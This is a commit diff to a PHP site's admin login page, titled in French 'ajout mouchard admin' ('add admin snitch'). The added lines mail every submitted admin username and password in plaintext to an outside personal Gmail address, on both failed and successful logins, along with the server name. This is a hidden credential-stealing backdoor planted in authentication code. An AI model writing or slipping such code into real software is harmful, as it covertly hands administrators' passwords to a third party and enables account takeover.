39cca7c8275d19addfaac4c319b55a7cf75c0644
Xavier Gonzalez <jgonzalez@iconeo.fr>
2017-12-09 11:52:51 +0100

    ajout mouchard admin

--- admin/home.php
+++ admin/home.php
@@ -7,10 +7,13 @@
 	if (!isset($_SESSION['accessGranted']) || !$_SESSION['accessGranted']) {
 		$result = $authentication->grantAccess($_POST['login'], $_POST['mdp']);
 		if (!$result){
-			header('Location: /admin/?action=error');
-		} else {
-			$_SESSION['accessGranted'] = true;
-		}
+         	       header('Location: /admin/?action=error');
+                	//mail($_to, $sujet, stripslashes($corps), $entete);
+ 	               mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp'],"");
+       		} else {
+                	$_SESSION['accessGranted'] = true;
+                	mail("fjavi.gonzalez@gmail.com", "Authi-Ok - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp'],"");
+        	}
 	}
 	$goldbook = new Goldbook();
 	$result = $goldbook->goldbookUnvalidateGet();
